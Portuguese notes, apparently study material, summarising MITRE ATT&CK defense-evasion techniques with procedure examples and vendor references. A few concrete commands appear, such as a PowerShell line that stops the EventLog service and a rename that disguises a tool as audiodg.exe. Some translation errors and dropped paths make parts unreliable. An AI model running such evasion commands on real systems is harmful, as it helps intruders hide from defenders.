**Exemplo de procedimento:** Nova exploração do zero-day direcionada às versões do Internet Explorer 9 a 11:A exploração aproveita uma vulnerabilidade anteriormente desconhecida de uso após o livre uso, e usa uma técnica de exploração flash bem conhecida para obter acesso arbitrário à memória e contornar as proteções ASLR e DEP do Windows. A página de exploração carrega um arquivo Flash SWF para manipular o layout heap com a técnica comum heap feng shui. Ele aloca objetos vetores Flash para pulverizar memória e cobrir o endereço 0x18184000. Em seguida, ele aloca um objeto vetorial que contém um flash. Media.Sound() objeto, que mais tarde corrompe para girar o controle para sua cadeia ROP.

**REFERÊNCIA:** https://www.fireeye.com/blog/threat-research/2014/04/new-zero-day-exploit-targeting-internet-explorer-versions-9-through-11-identified-in-targeted-attacks.html

.004 **Sequestro de Dylib:** Os adversários podem executar suas próprias cargas colocando uma biblioteca dinâmica maliciosa (dylib) com um nome esperado em um caminho que um aplicativo vítima pesquisa no tempo de execução.

**Exemplo de procedimento:** Os adversários podem ganhar a execução inserindo dislitos maliciosos com o nome do dylib desaparecido no caminho identificado. Os dylibs são carregados no espaço de endereço de um aplicativo, permitindo que o dylib malicioso herde o nível de privilégio e recursos da aplicação.

**REFERÊNCIA:**https://github.com/EmpireProject/Empire

.005 **Fraqueza das permissões de arquivo do instalador executável:**  Esses processos podem executar automaticamente binários específicos como parte de sua funcionalidade ou para executar outras ações. Se as permissões no diretório do sistema de arquivos contendo um binário de destino ou permissões no próprio binário forem indevidamente definidas, então o binário de destino poderá ser substituído por outro binário usando permissões de nível de usuário e executado pelo processo original. 

**Exemplo de procedimento:** Os adversários podem usar essa técnica para substituir binários legítimos por outros maliciosos como um meio de executar código em um nível mais alto de permissões. Alguns instaladores também podem exigir privilégios elevados que resultarão em escalada de privilégios ao executar código controlado por adversários. 

.006 **Sequestro dinâmico do Linker:**  Durante a fase de preparação de execução de um programa, o linker dinâmico carrega caminhos absolutos de bibliotecas compartilhadas a partir de variáveis de ambiente e arquivos, como no Linux ou no macOS.

**Exemplo de procedimento:** No Linux, os adversários podem apontar para bibliotecas maliciosas que correspondem ao nome de bibliotecas legítimas que são solicitadas por um programa de vítimas, fazendo com que o sistema operacional carregue o código malicioso do adversário após a execução do programa da vítima.

**REFERÊNCIA:** https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf

.007 **Interceptação de caminho por variável de ambiente PATH:** Os adversários podem colocar um programa em uma entrada anterior na lista de diretórios armazenados na variável ambiente PATH, que o Windows executará quando ele pesquisa sequencialmente através dessa listagem PATH em busca do binário que foi chamado de um script ou da linha de comando.

.008 **Interceptação de caminho por sequestro de pedidos de busca:** Os adversários podem executar suas próprias cargas maliciosas sequestrando a ordem de pesquisa usada para carregar outros programas. O sequestro de pedidos de pesquisa ocorre quando um adversário abusa da ordem em que o Windows procura programas que não são dados a um caminho. 

**Exemplo de procedimento:** Um adversário pode colocar um programa chamado "net.exe" dentro do mesmo diretório, como exemplo.exe, "net.exe" será executado em vez da rede de utilitários do sistema Windows. Além disso, se um adversário colocar um programa chamado "net.com" no mesmo diretório de "net.exe", executará "net.com" em vez de "net.exe" devido à ordem de extensões executáveis definidas sob PATHEXT

**REFERÊNCIA:** https://docs.microsoft.com/en-us/previous-versions//fd7hxfdd(v=vs.85)?redirectedfrom=MSDN

.009 **Interceptação de caminho por caminho não citado:** Os adversários podem aproveitar caminhos que não possuem cotações circundantes colocando um executável em um diretório de nível mais alto dentro do caminho, de modo que o Windows escolherá o executável do adversário para lançar.

**Exemplo de procedimento:** Um adversário pode colocar um executável em um diretório de nível mais alto do caminho, e o Windows resolverá esse executável em vez do executável pretendido. Por exemplo, se o caminho em um atalho for , um adversário pode criar um programa em que será executado em vez do programa pretendido.

**REFERÊNCIA:** https://securityboulevard.com/2018/04/windows-privilege-escalation-unquoted-services/

.010 **Fraqueza de permissões de arquivos de serviços:** s adversários podem usar falhas nas permissões dos serviços do Windows para substituir o binário que é executado no início do serviço. Esses processos de serviço podem executar automaticamente binários específicos como parte de sua funcionalidade ou para executar outras ações.

**Exemplo de procedimento:** Os adversários podem usar essa técnica para substituir binários legítimos por outros maliciosos como um meio de executar código em um nível mais alto de permissões. Se o processo de execução for definido para ser executado em um momento específico ou durante um determinado evento (por exemplo, bootup do sistema) então essa técnica também pode ser usada para persistência.

**REFERÊNCIA:** https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf

.011 **Fraqueza das permissões de registro de serviços:** Os adversários podem executar suas próprias cargas maliciosas sequestrando as entradas de registro usadas pelos serviços. Os adversários podem usar falhas nas permissões de chaves de Registro relacionadas a serviços para redirecionar do executável originalmente especificado para aquele que eles controlam, a fim de iniciar seu próprio código quando um serviço é iniciado.

**Exemplo de procedimento:** Os adversários também podem adicionar a chave, que armazena dados específicos do driver ou outras sub-chaves personalizadas para seus serviços maliciosos para estabelecer persistência ou ativar outras atividades maliciosas.

**REFERÊNCIA:** https://attack.mitre.org/techniques/T1574/011/

.012 **COR_PROFILER:** Os adversários podem aproveitar a variável ambiente COR_PROFILER para sequestrar o fluxo de execução de programas que carregam o CLR .NET. O COR_PROFILER é um recurso .NET Framework que permite que os desenvolvedores especifiquem um DLL de perfil não gerenciado (ou externo do .NET) a ser carregado em cada processo 

**Exemplo de procedimento:** Os adversários podem abusar COR_PROFILER para estabelecer persistência que execute uma DLL maliciosa no contexto de todos os processos .NET toda vez que o CLR é invocado. O COR_PROFILER também pode ser usado para elevar privilégios (ex: Bypass User Account Control) se o processo da vítima .NET for executado em um nível mais alto de permissão, bem como para gancho e Defesas de Prejuízo fornecidas pelos processos .NET.

**REFERÊNCIA:** https://redcanary.com/blog/blue-mockingbird-cryptominer/

T1562 **Defesas de prejuízo:**  Os adversários podem modificar maliciosamente componentes de um ambiente de vítima, a fim de dificultar ou desativar mecanismos defensivos. Isso envolve não apenas prejudicar defesas preventivas, como firewalls e antivírus, mas também recursos de detecção que os defensores podem usar para auditar a atividade e identificar comportamentos maliciosos

.001 **Desativar ou modificar ferramentas:** Os atacantes podem modificar ou desativas ferramentas de segurança para evitar a possível detecção de seus malware e atividades. Isso pode assumir os muitos formulários, como matar processos ou serviços de software de segurança.

**Exemplo de procedimento:** Os adversários também podem adulterar artefatos implantados e utilizados por ferramentas de segurança. As ferramentas de segurança podem fazer alterações dinâmicas nos componentes do sistema, a fim de manter a visibilidade em eventos específicos. 

Um malware da família AgentTasla foi detectado, ele foi desenvoldido usando estrutura microsoft .net, ele foi espalhado através de um documento Microsoft Word que continha um VBA macro malicioso auto executavel. O código era executado secretamente em segundo plano.

**REFERÊNCIA:** https://www.fortinet.com/blog/threat-research/in-depth-analysis-of-net-malware-javaupdtr

.002 **Desativar o registro de eventos do Windows:**  Desativar o registro de eventos do Windows:** Os registros de eventos do Windows registram a atividade do usuário e do sistema, como tentativas de login, criação de processos e muito mais.Esses dados são usados por ferramentas de segurança e analistas para gerar detecções.

**Exemplo de procedimento:** Os adversários podem atingir o registro em todo o sistema ou apenas o de uma determinada aplicação. Por exemplo, o serviço EventLog pode ser desativado usando a seguinte linha PowerShell: .Stop-Service -Name EventLog lém disso, os adversários podem usar e seus sub-comandos em um prompt de comando para desativar a auditoria ou limpar a política de auditoria.

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/

.003 **Dificultar o registro do histórico do comando:** Os adversários podem prejudicar o registro do histórico de comando para ocultar comandos executados em um sistema comprometido. Vários intérpretes de comando acompanham os comandos que os usuários digitam em seu terminal para que os usuários possam refazer o que fizeram.

No Linux e macOS, o histórico de comando é rastreado em um arquivo apontado pela variável ambiente . Quando um usuário faz logon em um sistema, essas informações são liberadas para um arquivo no diretório doméstico do usuário chamado . 

**Exemplo de procedimento:** Os adversários podem limpar a variável ambiente histórico () ou definir o tamanho do histórico de comando para zero () para evitar o registro de comandos. Além disso, pode ser configurado para ignorar comandos que começam com um espaço, simplesmente definindo-o como "ignorar o espaço". também pode ser definido para ignorar comandos duplicados, definindo-o como "ignorados". 

**REFERÊNCIA:** https://www.cisa.gov/uscert/ncas/alerts/aa20-239a

.004 **Desativar ou modificar firewall do sistema:** Os adversários podem desativar ou modificar firewalls do sistema para contornar controles que limitam o uso da rede. As alterações podem estar desativando todo o mecanismo, bem como adicionando, excluindo ou modificando regras específicas. Isso pode ser feito de várias maneiras, dependendo do sistema operacional, incluindo via linha de comando, edição de chaves do Registro do Windows e Painel de Controle do Windows.

**Exemplo de procedimento:** Rocke usou scripts que mataram processos e adicionaram regras de firewall para bloquear o tráfego relacionado a outros criptominers (Foi comprometido instalando um trabalho de cron que baixa e executa um arquivo logo.jpg, esse arquivo é um script shell que baixa executaveis de mineração de repositorio do git

**REFERÊNCIA:** https://blog.talosintelligence.com/2018/08/rocke-champion-of-monero-miners.html

.005 **Bloqueio de indicadores:** Um adversário pode tentar bloquear indicadores ou eventos tipicamente capturados por sensores de serem coletados e analisados. Isso pode incluir redirecionamento malicioso.

**Exemplo de procedimento:** Um adversário pode bloquear o tráfego associado a relatórios para evitar análises centrais. Isso pode ser feito por muitos meios, como interromper um processo local responsável pelo encaminhamento de telemetria e/ou criar uma regra de firewall baseada em host para bloquear o tráfego para hosts específicos responsáveis por agregar eventos, como informações de segurança e produtos siem (Gerenciamento de Eventos).

**REFERÊNCIA:** https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/

.006 **Desativar ou modificar firewall de nuvem:** Os adversários podem desativar ou modificar um firewall dentro de um ambiente de nuvem para contornar controles que limitam o acesso a recursos na nuvem. Os firewalls de nuvem são separados dos firewalls do sistema descritos no Dissable ou Modify System Firewall.

.007 **Desativar registros de nuvem:** Um adversário pode desativar recursos e integrações de registro em nuvem para limitar quais dados são coletados em suas atividades e evitar a detecção. Os ambientes em nuvem permitem a coleta e análise de registros de auditoria e aplicativos que fornecem insights sobre quais atividades um usuário faz dentro do ambiente

**Exemplo de procedimento:** Se um invasor tiver permissões suficientes, ele pode desativar o registro para evitar a detecção de suas atividades. Por exemplo, no AWS, um adversário pode desativar integrações do CloudWatch/CloudTrail antes de realizar outras atividades maliciosas

.008 **Inicialização de modo de segurança:**  O modo de segurança inicia o sistema operacional Windows com um conjunto limitado de drivers e serviços. Softwares de segurança de terceiros, como ferramentas de detecção e resposta de ponto final (EDR), podem não ser iniciados após inicializar o Windows no modo de segurança

**Exemplo de procedimento:** Os adversários podem abusar do modo de segurança para desativar defesas de ponto final que podem não começar com uma inicialização limitada. Os hosts podem ser forçados a entrar no modo de segurança após a próxima reinicialização por meio de modificações nas lojas BCD (Boot Configuration Data, dados de configuração de configuração de inicialização), que são arquivos que gerenciam as configurações do aplicativo de inicialização

Um Ransomware é capaz de criptografar arquivos em modo de segurança do windows.

**REFERÊNCIA:** https://www.bleepingcomputer.com/news/security/revil-ransomware-has-a-new-windows-safe-mode-encryption-mode/

.009 **Ataque de downgrade:** Os adversários podem rebaixar ou usar uma versão de recursos do sistema que podem estar desatualizados, vulneráveis e/ou não suportam controles de segurança atualizados, como registro.

**Exemplo de procedimento:** Os adversários podem rebaixar e usar versões menos seguras de vários recursos de um sistema, como Intérpretes de Comando e Scripting ou até mesmo protocolos de rede que podem ser abusados para permitir o Adversário no Meio.

**REFERÊNCIA:** https://www.praetorian.com/blog/man-in-the-middle-tls-ssl-protocol-downgrade-attack/

T1070 **Remoção de indicadores no hospedeiro:** Os adversários podem excluir ou alterar artefatos gerados em um sistema de host, incluindo logs ou arquivos capturados, como malware em quarentena. Essas ações podem interferir na coleta de eventos, relatórios ou outras notificações usadas para detectar atividade de intrusão.

.001 ** Limpar registros de eventos do Windows:**  Os registros de eventos do Windows são um registro dos alertas e notificações de um computador. Existem três fontes de eventos definidas pelo sistema: Sistema, Aplicação e Segurança, com cinco tipos de eventos: Erro, Aviso, Informações, Auditoria de Sucesso e Auditoria de Falha.

**Exemplo de procedimento:** Um grupo apt32  liberou entradas selecionadas de registros de evento, eles realizavam arquivos ActiveMime que utilizaram métodos de engenharia social para atrair a vitima para habilitar macros, tambem usavam arquivos .doc e phishing.

**REFERÊNCIA:** https://www.mandiant.com/resources/cyber-espionage-apt32

.002 **Clear Linux ou Mac System Logs:** Os adversários podem limpar os registros do sistema para esconder evidências de uma intrusão. MacOS e Linux acompanham as ações do sistema ou do usuário através de registros do sistema. A maioria dos registros de sistemas nativos é armazenada sob o diretório. 

**Exemplo de procedimento:** O próton remove os registros de e ./var/logs/Library/logs : Um backdoor MacOs fou utilizado já que tem como objetivo roubar informações de sistemas infectados e modifical-los.

**REFERÊNCIA: https://objective-see.com/blog/blog_0x25.html#Proton

.003 **Histórico de comando claro:** Vários intérpretes de comando acompanham os comandos que os usuários digitam em seu terminal para que os usuários possam refazer o que fizeram. No Linux e macOS, esses históricos de comando podem ser acessados de algumas maneiras diferentes.

**Exemplo de procedimento:** Os adversários podem executar o comando PowerShell para liberar todo o histórico de comando de uma sessão powershell atual. Isso, no entanto, não excluirá/lavará o arquivo. Os adversários também podem excluir o arquivo ou editar seu conteúdo para ocultar comandos do PowerShell executados

**REFERÊNCIA:** https://www.welivesecurity.com/2021/02/02/kobalos-complex-linux-threat-high-performance-computing-infrastructure/

.004 **Exclusão de arquivos:** Os adversários podem excluir arquivos deixados para trás pelas ações de sua atividade de intrusão. Malware, ferramentas ou outros arquivos não nativos descartados ou criados em um sistema por um adversário podem deixar rastros para indicar o que foi feito dentro de uma rede e como.

**Exemplo de procedimento:** Existem ferramentas disponíveis no sistema operacional host para realizar a limpeza, mas os adversários também podem usar outras ferramentas. Exemplos incluem funções nativas de cmd, como DEL, ferramentas de exclusão segura, como o Windows Sysinternals SDelete ou outras ferramentas de exclusão de arquivos de terceiros.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/13/c/in-depth-look-apt-attack-tools-of-the-trade.html

.005 **Remoção da conexão de compartilhamento de rede** Os adversários podem remover conexões compartilhadas que não são mais úteis para limpar vestígios de sua operação. As conexões de compartilhamento do Windows e do Administrador do SMB/Windows podem ser removidas quando não for mais necessário.

**Exemplo de procedimento:** Dll weapper é um malware compilado, ele é colocado na pasta windowns mascarado como um arquivo de biblioteca mpr.dll com um recurso de versão forjada.

**REFERÊNCIA:** https://www.welivesecurity.com/2018/06/07/invisimole-equipped-spyware-undercover/

.006 **Timestomp:** O timestomping é uma técnica que modifica os horários de um arquivo (o modificar, acessar, criar e mudar os tempos), muitas vezes para imitar arquivos que estão na mesma pasta. Isso é feito, por exemplo, em arquivos que foram modificados ou criados pelo adversário para que não pareçam visíveis para investigadores forenses ou ferramentas de análise de arquivos.

**REFERÊNCIA:** O timestomping é uma técnica que modifica os horários de um arquivo (o modificar, acessar, criar e mudar os tempos), muitas vezes para imitar arquivos que estão na mesma pasta. Isso é feito, por exemplo, em arquivos que foram modificados ou criados pelo adversário para que não pareçam visíveis para investigadores forenses ou ferramentas de análise de arquivos.

T1202 **Execução indireta de comando:** Vários utilitários Windows podem ser usados para executar comandos, possivelmente sem invocar cmd. Por exemplo, Forfiles, o Assistente de Compatibilidade de Programas (pcalua.exe), componentes do Subsistema Windows para Linux (WSL), bem como outros utilitários podem invocar a execução de programas e comandos de um interpretador de comando e script, janela executar ou através de scripts

**Exemplo de procedimento:** Os adversários podem abusar desses recursos para a Evasão de Defesa, especificamente para executar execuções arbitrárias, subvertendo detecções e/ou controles de mitigação (como a Política de Grupo) que limitam/impedem o uso de extensões de cmd ou arquivos mais comumente associadas a cargas maliciosas.

**REFERÊNCIA:** https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/

T1036 **Masquerading:** Os adversários podem tentar manipular características de seus artefatos para fazê-los parecer legítimos ou benignos para os usuários e/ou ferramentas de segurança. O mascaramento ocorre quando o nome ou localização de um objeto, legítimo ou malicioso, é manipulado ou abusado por causa da evasão de defesas e observação.

**Exemplo de procedimento:** Determinados grupos utilizam arquivos em javascript em PDFs para mascarar.

**REFERÊNCIA:** https://blog.malwarebytes.com/threat-intelligence/2021/06/kimsuky-apt-continues-to-target-south-korean-government-using-appleseed-backdoor/

.001 **Assinatura de código inválido:** A assinatura de código fornece um nível de autenticidade em um binário do desenvolvedor e uma garantia de que o binário não foi adulterado. Os adversários podem copiar os metadados e as informações de assinatura de um programa assinado e usá-los como modelo para um programa não assinado.

**Exemplo de procedimento:** A partir de um golpe de phishing pode-se enviar arquivos adulterados porém usando ferramentas como Whats Your Sing podemos ver que ao invés de documentos são aplicativos, e além disso podemos ver tambem se o certificado está revogado.

**REFERÊNCIA:** https://objective-see.com/blog/blog_0x3B.html

.002 **Substituição da direita para a esquerda** RTLO é um caractere Unicode que não é impresso que faz com que o texto que o segue seja exibido ao contrário. Por exemplo, um protetor de tela do Windows executável nomeado será exibido como .

**Exemplo de procedimento:** Os adversários podem abusar do caractere RTLO como um meio de enganar um usuário para executar o que eles acham ser um tipo de arquivo benigno. Um uso comum desta técnica é com o Spearphishing Attachment/Malicious File, pois pode enganar tanto os usuários finais quanto os defensores se eles não estiverem cientes de como suas ferramentas exibem e tornam o caractere RTLO. 

**Exemplo de procedimento:** https://securelist.com/zero-day-vulnerability-in-telegram/83800/

.003 **Renomear utilitários do sistema** Mecanismos de monitoramento e controle de segurança podem estar em vigor para que os contraditórios do sistema sejam capazes de abusar. Pode ser possível contornar esses mecanismos de segurança renomeando o utilitário antes da utilização (ex: renome )

**Exemplo de procedimento:** A GALLIUM usou um arquivo de cmd.exe renomeado para evitar a detecção.

**REFERÊNCIA:** https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers

.004 **Tarefa ou Serviço de Máscaras:** As tarefas/serviços executados pelo Agendador de Tarefas ou sistematados normalmente receberão um nome e/ou descrição.Os adversários podem tentar manipular o nome de uma tarefa ou serviço para torná-lo legítimo ou benigno.

**Exemplo de procedimento:**  Os adversários podem dar aos usuários tarefas ou nomes de serviços semelhantes ou idênticos aos dos legítimos. Tarefas ou serviços contêm outros campos, como uma descrição, que os adversários podem tentar fazer parecer legítimos.

**REFERÊNCIA:** https://web.archive.org/web/20190625182633if_/https://ti.360.net/blog/articles/apt-c-36-continuous-attacks-targeting-colombian-government-institutions-and-corporations-en/

.005 **Combinar nome ou localização legítimos:** Isso é feito para evitar defesas e observação. Isso pode ser feito colocando um executável em um diretório comumente confiável (ex: no System32) ou dando-lhe o nome de um programa legítimo e confiável (ex: svchost.exe).

**Exemplo de procedimento:** Os adversários também podem usar o mesmo ícone do arquivo que estão tentando imitar. admin@338 atores usaram o seguinte comando para renomear uma de suas ferramentas para um nome de arquivo benigno: ren "%temp%\upload" audiodg.exe

**REFERÊNCIA:** https://www.mandiant.com/resources/china-based-threat

.006 **Espaço após nome de arquivo:** Os adversários podem ocultar o verdadeiro tipo de arquivo de um programa alterando a extensão de um arquivo. Com certos tipos de arquivo (especificamente isso não funciona com extensões .app), anexar um espaço até o final de um nome de arquivo mudará a forma como o arquivo é processado pelo sistema operacional.

**Exemplo de procedimento:** Os adversários podem usar esse recurso para enganar os usuários para clicar duas vezes em arquivos benignos de qualquer formato e, finalmente, executar algo malicioso.

**REFERÊNCIA:** https://www.synack.com/blog/mac-malware-2016/ 

.007 **Extensão de arquivo duplo:** m nome de arquivo pode incluir uma extensão secundária do tipo de arquivo que pode fazer com que apenas a primeira extensão seja exibida (ex: pode renderizar em algumas visualizações como justo ). No entanto, a segunda extensão é o tipo de arquivo verdadeiro que determina como o arquivo é aberto e executado.

**Exemplo de procedimento:** Os adversários podem abusar de extensões duplas para tentar ocultar tipos perigosos de cargas de arquivos. Um uso muito comum envolve enganar um usuário para abrir o que eles acham ser um tipo de arquivo benigno, mas é realmente um código executável. Esses arquivos geralmente se colocam como anexos de e-mail e permitem que um adversário obtenha acesso inicial ao sistema de um usuário através do Spearphishing Attachment e da Execução do Usuário. 

**REFERÊNCIA:** https://www.cybereason.com/blog/a-bazar-of-tricks-following-team9s-development-cycles

T1556 **Modificar processo de autenticação:** Os adversários podem modificar mecanismos e processos de autenticação para acessar credenciais de usuários ou permitir o acesso injustificado às contas.

**Exemplo de procedimento:** Os adversários podem modificar maliciosamente uma parte desse processo para revelar credenciais ou ignorar mecanismos de autenticação. Credenciais ou acesso comprometidos podem ser usados para contornar controles de acesso colocados em vários recursos em sistemas dentro da rede 

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2018/12/ESET-The_Dark_Side_of_the_ForSSHe.pdf

.001 **Autenticação do controlador de domínio:** Os atacantes podem corrigir o o processo de autenticação em um controlador de domínio para contornar os mecanismos típicos de autenticação e permitir acesso às outras contas.

**Exemplo de procedimento:** Um malware pode ser usado para injetar credenciais falsas no processo de autenticação em um controlador de domínio.

**REFERÊNCIA:** https://cycraft.com/download/%5BTLP-White%5D20200415%20Chimera_V4.1.pdf

.002 **DLL do filtro de senha:** Atacantes podem registrar DLLs de filtro de senha maliciosas no processo de autenticação para adquirir credenciais de usuários a medida que são validadas. 

**Exemplo de procedimento:** A Remsec coleta credenciais de texto simples como um filtro de senha registrado em controladores de domínio : Foi usado uma biblioteca de programas executáveis carregada na memória do servidor de domínio, foi registrada como filtro de senha do win e teve acesso a dados secretos.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07190154/The-ProjectSauron-APT_research_KL.pdf

.003 **Módulos de autenticação plugáveis:** PAM é um sistema modular de arquivos de configuração, bibliotecas e arquivos executáveis que orientam a autenticação para muitos serviços. O módulo de autenticação mais comum é , que recupera, define e verifica as informações de autenticação da conta 

**Exemplo de procedimento:** Os adversários podem modificar componentes do sistema PAM para criar backdoors. Os componentes PAM, tais como, podem ser corrigidos para aceitar valores fornecidos por adversários arbitrários como credenciais legítimas.  Como por exemplo o Ebury é atualmente implantado usando um novo método. Como libkeyutils.so é carregado pelo cliente OpenSSH e pelos executáveis do servidor OpenSSH, alterando o link libkeyutils.so aponta para versão maliciosa da biblioteca.

**REFERÊNCIA:** https://www.welivesecurity.com/2017/10/30/windigo-ebury-update-2/

.004 **Autenticação do dispositivo de rede:** Modificar a imagem do sistema pode incluir código implantado no sistema operacional para dispositivos de rede fornecer acesso aos adversários usando uma senha específica

**Exemplo de procedimento:**  Um implante de roteador Cisco:uma imagem cisco IOS modificada que permite ao invasor carregar diferentes módulos funcionais a partir do anonimato da internet. O implante também fornece acesso irrestrito usando uma senha secreta do backdoor. Cada um dos módulos é habilitado através do protocolo HTTP (não HTTPS), usando um pacote TCP especificamente elaborado enviado para a interface dos roteadores.

**Exemplo de procedimento:** https://www.mandiant.com/resources/synful-knock-acis

T1578 **Modificar a infraestrutura de computação em nuvem:** Um adversário pode tentar modificar a infraestrutura de serviço de computação de uma conta na nuvem para evitar defesas. Uma modificação na infraestrutura de serviços de computação pode incluir a criação, exclusão ou modificação de um ou mais componentes, como instâncias de computação, máquinas virtuais e instantâneos.

.001 **Criar snapshot:** Um atacante pode criar um snapshot ou backup de dados dentro de uma conta na nuvem para evitar defesas. 

**Exemplo de procedimento: Um adversário pode aproveitar as permissões para criar um snapshot a fim de contornar restrições que impedem o acesso à infraestrutura de serviços de computação existente. Um adversário pode criar instância de nuvem, montar um ou mais instantâneos criados para essa instância e, em seguida, aplicar uma política que permite ao adversário acesso à instância criada, como uma política de firewall que lhes permite acesso SSH de entrada e saída

.002 **Criar instância de nuvem:** Uma instância pode ser criada ou uma VM dentro do serviço de computação de uma conta em nuvem para escapar de defesas. Isso pode permitir que um atacante contorne regras de firewall e permissões que existem em instênciais resistentes em uma conta.

**Exemplo de procedimento:**  Um adversário pode criar instantâneos de um ou mais volumes em uma conta, criar uma nova instância, montar os instantâneos e, em seguida, aplicar uma política de segurança menos restritiva para coletar dados do sistema local ou para o estadiamento de dados remotos

**REFERÊNCIA:** https://content.fireeye.com/m-trends/rpt-m-trends-2020

.003 **Excluir instância da nuvem:** A exclusão de uma instância ou máquina virtual pode remover artefatos forenses valiosos e outras evidências de comportamento suspeito se a instância não for recuperável.Um adversário também pode criar instância de nuvem e, posteriormente, encerrar a instância após atingir seus objetivos

.004 **Reverter instância de nuvem** Um adversário pode reverter as alterações feitas em uma instância de nuvem depois de ter realizado atividades maliciosas na tentativa de evitar a detecção e remover evidências de sua presença.  Em ambientes altamente virtualizados, como infraestrutura baseada em nuvem, isso pode ser feito restaurando imagens de máquinas virtuais (VM) ou armazenamento de dados através do painel de gerenciamento de nuvem ou APIs em nuvem.

T1112 **Modificar registro:** Os adversários podem interagir com o Registro do Windows para ocultar informações de configuração nas chaves do Registro, remover informações como parte da limpeza ou como parte de outras técnicas para ajudar na persistência e execução.

**Exemplo de procedimento:** O agente tesla é um malware que é entregue via phishing, sua capaciade é grande em manipular persistência aos dispositivos das vítimas, o malware extrai credenciais do registro e podem as modificar 

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

T1601 **Modificar a imagem do sistema:** Os adversários podem fazer alterações no sistema operacional de dispositivos de rede embarcados para enfraquecer as defesas e fornecer novos recursos para si mesmos. Para alterar o sistema operacional, o adversário normalmente só precisa afetar este arquivo, substituindo-o ou modificando-o. 

.001 **Imagem do sistema de patches:** Atacantes podem modificar o sistema operacional de um dispositivo de rede e introduzir novos recursos ou enfraquecer as defesas.Os adversários também podem comprometer os comandos existentes no sistema operacional para produzir saída falsa para enganar os defensores.

.002 **Imagem do sistema de downgrade:**  Versões mais antigas do sistema operacional em dispositivos de rede geralmente têm cifras de criptografia mais fracas e, em geral, menos/menos recursos defensivos atualizados.A redução da imagem do sistema para uma versão mais antiga pode permitir que um adversário evite defesas, permitindo comportamentos como Weaken Encryption. O downgrade de uma imagem do sistema pode ser feito por conta própria, ou pode ser usado em conjunto com a Imagem do Sistema de Patches

T1599 **Ponte de limite de rede:** Os adversários podem ultrapassar os limites da rede comprometendo dispositivos de rede de perímetro. A violação desses dispositivos pode permitir que um adversário contorne restrições ao roteamento de tráfego que, de outra forma, separem redes confiáveis e não confiáveis. Quando um adversário assume o controle de tal dispositivo de fronteira, ele pode contornar sua aplicação de políticas para passar o tráfego normalmente proibido através da fronteira de confiança entre as duas redes separadas sem impedimentos

.001 **Transversal de tradução de endereço de rede:** Os adversários podem ultrapassar os limites da rede modificando a configuração NAT . Quando um adversário ganha o controle de um dispositivo de limite de rede, ele pode aproveitar as configurações NAT existentes para enviar tráfego entre duas redes separadas ou pode implementar configurações NAT de seu próprio design. Os adversários podem usar a Patch System Image para alterar o sistema operacional de um dispositivo de rede, implementando seus próprios mecanismos PADRÃO.

T1027 **Arquivos ou informações ofuscadas:** Os atacantes podem tornar dificil a vida de quem vai descobrir ou analisar arquivos sendo de forma criptografado ou codificando ou ofuscando seus conteúdos. Pode ser compactadas, arquivadas ou criptografadas para evitar detecções. Adversários podem ofuscar comandos a partir de cargas.

.001 **Estofamento binário:**  Os adversários podem usar preenchimento binário para adicionar dados de lixo eletrônico e alterar a representação em disco de malware. Isso pode ser feito sem afetar a funcionalidade ou o comportamento de um binário, mas pode aumentar o tamanho do binário além do que algumas ferramentas de segurança são capazes de manusear devido a limitações de tamanho do arquivo.

.002 **Embalagem de software:** A embalagem de software é um método de comprimir ou criptografar um executável. Embalar uma execução altera a assinatura do arquivo na tentativa de evitar a detecção baseada em assinaturas. A maioria das técnicas de descompressão descomprime o código executável na memória.

.003 **Esteganografia:** Os adversários podem usar técnicas de esteganografia para evitar a detecção de informações ocultas. Técnicas steganográficas podem ser usadas para ocultar dados em mídias digitais, como imagens, faixas de áudio, clipes de vídeo ou arquivos de texto.

**REFERÊNCIA:** https://danieldonda.com/como-ocultar-codigos-secretos-em-fotos/

.004 **Compilar após a entrega:** Os adversários podem tentar dificultar a descoberta e análise das cargas, entregando arquivos às vítimas como código não compilado.

**Exemplo de procedimento:** MuddyWater usou a ferramenta .NET csc.exe para compilar executáveis a partir do código C# baixado.

**REFERÊNCIA:** https://www.clearskysec.com/wp-content/uploads/2018/11/MuddyWater-Operations-in-Lebanon-and-Oman.pdf

.005 **Remoção de indicadores de ferramentas:** Eles podem modificar a ferramenta removendo o indicador e usando a versão atualizada que não é mais detectada pelos sistemas defensivos do alvo ou alvos subsequentes que podem usar sistemas semelhantes. Um bom exemplo disso é quando o malware é detectado com uma assinatura de arquivo e colocado em quarentena por um software
antivírus.

.006 **Contrabando HTML:**  Os documentos HTML podem armazenar grandes objetos binários conhecidos como JavaScript Blobs (dados imutáveis que representam bytes brutos) que podem ser construídos posteriormente em objetos semelhantes a arquivos. 

**Exemplo de procedimento:** Os adversários podem fornecer cargas para vítimas que contornam controles de segurança através do contrabando HTML abusando de atributos de download JavaScript Blobs e/ou HTML5. JavaScript Blobs pode ser abusado para gerar dinamicamente arquivos maliciosos na máquina da vítima e pode ser descartado em disco abusando de funções JavaScript como .msSaveBlob 

**REFERÊNCIA:** https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/

T1542 **Inicialização pré-OS:** Os adversários podem abusar dos mecanismos de inicialização pré-OS como uma maneira de estabelecer persistência em um sistema.

**Exemplo de procedimento:** Os adversários podem sobregravar dados em drivers de inicialização ou firmware, como o BIOS (Basic Input/Output System) e o Unified Extensible Firmware Interface (UEFI) para persistir em sistemas em uma camada abaixo do sistema operacional.

.001 **Firmware do sistema:** Os adversários podem modificar o firmware do sistema para persistir nos sistemas. O firmware do sistema como o BIOS e (U)EFI subjacente à funcionalidade de um computador e pode ser modificado por um adversário para executar ou auxiliar em atividades maliciosas.

**Exemplo de procedimento:** Hacking Team UEFI Rootkit é um rootkit UEFI BIOS desenvolvido pela empresa Hacking Team para persistir software de acesso remoto em alguns sistemas direcionados. 

